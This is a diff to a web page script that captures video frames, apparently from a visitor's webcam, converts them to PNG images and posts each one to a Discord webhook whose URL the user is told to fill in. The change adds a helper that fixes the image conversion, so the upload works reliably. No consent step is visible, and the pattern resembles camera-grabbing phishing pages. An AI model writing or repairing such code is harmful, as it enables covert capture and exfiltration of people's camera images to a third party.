@@ -92,9 +92,9 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             const imgURL = canvas.toDataURL('image/png');
 
-            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
+            const webhookURL = 'YOUR_MODIFIED_DISCORD_WEBHOOK_URL'; // Modify this with your Discord webhook URL
             const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
-            const imgBlob = new Blob([window.atob(imgData)], { type: 'image/png' });
+            const imgBlob = dataURItoBlob(imgURL);
             const imgFormData = new FormData();
             imgFormData.append('image' + imgIndex, imgBlob, 'captured_image_' + imgIndex + '.png');
 
@@ -105,6 +105,16 @@
 
             console.log('Image ' + imgIndex + ' sent to Discord webhook');
             imgIndex++;
+        }
+
+        function dataURItoBlob(dataURI) {
+            var byteString = atob(dataURI.split(',')[1]);
+            var ab = new ArrayBuffer(byteString.length);
+            var ia = new Uint8Array(ab);
+            for (var i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: 'image/png' });
         }
 
         const downloadButton = document.getElementById('downloadButton');
